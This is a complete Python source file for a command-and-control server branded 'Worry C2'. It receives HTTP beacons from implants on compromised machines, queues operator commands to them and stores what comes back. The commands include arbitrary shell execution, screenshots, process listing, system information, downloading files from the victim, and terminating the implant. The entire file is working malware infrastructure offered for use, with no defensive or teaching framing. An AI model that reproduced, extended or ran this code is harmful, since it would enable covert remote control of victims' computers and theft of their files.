#!/usr/bin/env python3
# ============================================================
#  WORRY C2 — Command & Control Server
# ============================================================
#  Usage: python3 c2_server.py [port]
#
#  Commands:
#    clients              List connected clients
#    select <id|#>        Select a client
#    back                 Deselect
#    shell <cmd>          Run command on target
#    screenshot           Take screenshot
#    sysinfo              System info
#    ps                   Process list
#    download <path>      Download file from target
#    cd <path>            Change directory on target
#    kill                 Terminate implant
# ============================================================

import http.server, socketserver, threading, time, sys, os
from datetime import datetime

clients = {}  # id -> {hostname, user, ip, last_seen, queue, pending_cmd}
lock = threading.Lock()

class C2Handler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        parts = self.path.strip('/').split('/')
        # Beacon: GET /c/<id>/<hostname>/<username>
        if len(parts) >= 4 and parts[0] == 'c':
            cid, host, user = parts[1], parts[2], parts[3]
            with lock:
                if cid not in clients:
                    clients[cid] = {
                        'hostname': host, 'user': user,
                        'ip': self.client_address[0],
                        'last_seen': time.time(), 'queue': [],
                        'pending_cmd': None
                    }
                    print(f"\n\033[32m[+] New client: {cid[:8]} | {host} | {user} | {self.client_address[0]}\033[0m")
                    print_prompt()
                clients[cid]['last_seen'] = time.time()
                # Send queued command or 'none'
                if clients[cid]['queue']:
                    cmd = clients[cid]['queue'].pop(0)
                    clients[cid]['pending_cmd'] = cmd.split(':')[0]
                    self._respond(200, cmd.encode())
                else:
                    self._respond(200, b'none:')
        else:
            self._respond(404, b'')

    def do_POST(self):
        parts = self.path.strip('/').split('/')
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)

        # Result: POST /r/<id>/<cmd>[/<extra>]
        if len(parts) >= 3 and parts[0] == 'r':
            cid, cmd = parts[1], parts[2]
            extra = '/'.join(parts[3:]) if len(parts) > 3 else ''

            with lock:
                if cid in clients:
                    clients[cid]['pending_cmd'] = None

            if cmd == 'screenshot':
                fname = f"screenshot_{cid[:8]}_{int(time.time())}.bmp"
                with open(fname, 'wb') as f:
                    f.write(body)
                print(f"\n\033[33m[+] Screenshot saved: {fname} ({len(body)} bytes)\033[0m")
                print_prompt()

            elif cmd == 'download':
                fname = extra.replace('\\', '/').split('/')[-1] if extra else f"download_{int(time.time())}"
                with open(fname, 'wb') as f:
                    f.write(body)
                print(f"\n\033[33m[+] Downloaded: {fname} ({len(body)} bytes)\033[0m")
                print_prompt()

            else:
                text = body.decode('utf-8', errors='replace').rstrip()
                if text:
                    print(f"\n{text}")
                    print_prompt()

            self._respond(200, b'ok')
        else:
            self._respond(404, b'')

    def _respond(self, code, data):
        self.send_response(code)
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *args):
        pass

class ThreadedServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

# ---- CLI ----

selected = None

def print_prompt():
    global selected
    if selected and selected in clients:
        c = clients[selected]
        p = f"\033[31m({selected[:8]}@{c['hostname']})\033[0m > "
    else:
        p = "\033[31mworry\033[0m > "
    print(p, end='', flush=True)

def send_cmd(cmd_str):
    global selected
    if not selected or selected not in clients:
        print("[-] No client selected")
        return
    with lock:
        clients[selected]['queue'].append(cmd_str)

def cli():
    global selected
    print()
    print_prompt()

    while True:
        try:
            cmd = input().strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shutting down...")
            break

        if not cmd:
            print_prompt()
            continue

        if cmd == 'help':
            print("""
\033[31mWorry C2\033[0m — Commands:

  clients              List connected clients
  select <id|#>        Select a client
  back                 Deselect client

  \033[33mClient commands (after select):\033[0m
  shell <command>      Execute command on target
  screenshot           Take screenshot
  sysinfo              System information
  ps                   Process list
  download <path>      Download file from target
  cd <path>            Change directory
  kill                 Terminate implant

  Any other input is treated as a shell command.
""")

        elif cmd == 'clients':
            with lock:
                if not clients:
                    print("[*] No clients connected")
                else:
                    now = time.time()
                    print(f"\n  {'#':>3}  {'ID':8}  {'Hostname':15}  {'User':15}  {'IP':15}  {'Last Seen':10}")
                    print("  " + "-" * 72)
                    for i, (cid, c) in enumerate(clients.items()):
                        ago = int(now - c['last_seen'])
                        if ago < 60:
                            ls = f"{ago}s ago"
                        elif ago < 3600:
                            ls = f"{ago//60}m ago"
                        else:
                            ls = f"{ago//3600}h ago"
                        alive = "\033[32m●\033[0m" if ago < 15 else "\033[31m●\033[0m"
                        print(f"  {i+1:>3}  {cid[:8]:8}  {c['hostname']:15}  {c['user']:15}  {c['ip']:15}  {alive} {ls:10}")
                    print()

        elif cmd.startswith('select'):
            parts = cmd.split(None, 1)
            if len(parts) < 2:
                print("Usage: select <id|#>")
            else:
                target = parts[1]
                with lock:
                    cids = list(clients.keys())
                    try:
                        idx = int(target) - 1
                        if 0 <= idx < len(cids):
                            selected = cids[idx]
                            c = clients[selected]
                            print(f"[+] Selected: {selected[:8]} ({c['hostname']})")
                        else:
                            print("[-] Invalid index")
                    except ValueError:
                        matches = [c for c in cids if c.startswith(target)]
                        if matches:
                            selected = matches[0]
                            c = clients[selected]
                            print(f"[+] Selected: {selected[:8]} ({c['hostname']})")
                        else:
                            print("[-] Client not found")

        elif cmd == 'back':
            selected = None

        elif cmd == 'exit' or cmd == 'quit':
            print("[*] Shutting down...")
            break

        elif selected:
            if cmd.startswith('shell '):
                send_cmd(f"shell:{cmd[6:]}")
            elif cmd == 'screenshot':
                send_cmd('screenshot:')
                print("[*] Waiting for screenshot...")
            elif cmd == 'sysinfo':
                send_cmd('sysinfo:')
            elif cmd == 'ps':
                send_cmd('ps:')
            elif cmd.startswith('download '):
                send_cmd(f"download:{cmd[9:]}")
                print("[*] Waiting for file...")
            elif cmd.startswith('cd '):
                send_cmd(f"cd:{cmd[3:]}")
            elif cmd == 'kill':
                send_cmd('kill:')
                print(f"[*] Kill sent to {selected[:8]}")
                selected = None
            else:
                # Treat as shell command
                send_cmd(f"shell:{cmd}")
        else:
            print("[-] Select a client first. Type 'clients' to list, 'select <#>' to choose.")

        print_prompt()

# ---- Main ----

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
    banner = f"""
\033[31m
 █   █ █▀▀█ █▀▀█ █▀▀█ █  █
 █▄█▄█ █  █ █▄▄▀ █▄▄▀ █▄▄█
  █ █  █▄▄█ █  █ █  █  ▄▄█  C2
\033[0m
  #Made By Worry.
  Listening on 0.0.0.0:{port}
"""
    print(banner)

    server = ThreadedServer(('0.0.0.0', port), C2Handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()

    cli()
    server.shutdown()
